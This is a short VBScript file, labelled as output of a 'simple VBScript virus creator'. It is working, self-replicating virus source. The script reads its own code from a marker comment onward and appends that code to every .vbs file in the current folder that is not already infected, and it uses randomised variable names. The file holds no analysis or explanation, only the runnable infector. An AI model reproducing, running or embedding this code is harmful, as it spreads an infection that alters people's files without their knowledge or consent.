'3
'Created by ddd with SIMPLE VBSCRIPT VIRUS CREATOR v2.1b 
Set PLMGGR = CreateObject("Scripting.FileSystemObject")
Set AQRPAJ = PLMGGR.OpenTextFile(Wscript.ScriptFullName, 1)
SRIVTB = AQRPAJ.ReadAll
JJPHNE = InStr(1, SRIVTB, "'3", 1)
Set AQRPAJ = PLMGGR.OpenTextFile(Wscript.ScriptFullName, 1)
AQRPAJ.Skip(JJPHNE -1)
SRIVTB = AQRPAJ.Read(769)
Set UILQBN = PLMGGR.GetFolder(".").Files
For Each KGNOFG in UILQBN
 SSMVUE = LCASE(PLMGGR.GetExtensionName(KGNOFG.path))
 If SSMVUE = "vbs" then
  Set PVFLCV = PLMGGR.OpenTextFile(KGNOFG.path, 1)
  GBGIGU = PVFLCV.ReadAll
  VIGDDO = InStr(1, GBGIGU, "'3", 1)
  If VIGDDO = 0 then
   Set OAMCCR = PLMGGR.OpenTextFile(KGNOFG.path, 8, True)
   OAMCCR.WriteLine SRIVTB
   OAMCCR.Close
  End If
 End If
Next
